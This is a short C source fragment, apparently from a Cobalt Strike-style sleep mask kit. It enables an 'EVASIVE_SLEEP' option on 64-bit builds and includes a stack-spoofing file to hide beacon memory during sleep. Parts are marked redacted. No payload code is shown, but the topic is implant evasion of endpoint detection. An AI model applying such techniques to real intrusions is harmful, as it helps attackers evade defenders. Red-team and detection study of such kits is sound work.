#include <windows.h>
#include "beacon.h"
#include "bofdefs.h"
#include "sleepmask.h"

/* EVASIVE_SLEEP information:
 *   Depending on how large your sleep mask code/data becomes you may need to modify
 *   the ImageSize and Img.Length variables in evasive_sleep.c in order to fully
 *   mask the sleep mask BOF memory.
 *
 *   EVASIVE_SLEEP is not supported on x86.
 */
#if _WIN64
#define EVASIVE_SLEEP 1
#endif

/* redacted */

#if EVASIVE_SLEEP
//#include "evasive_sleep.c"
#include "evasive_sleep_stack_spoof.c"
#endif

/* redacted */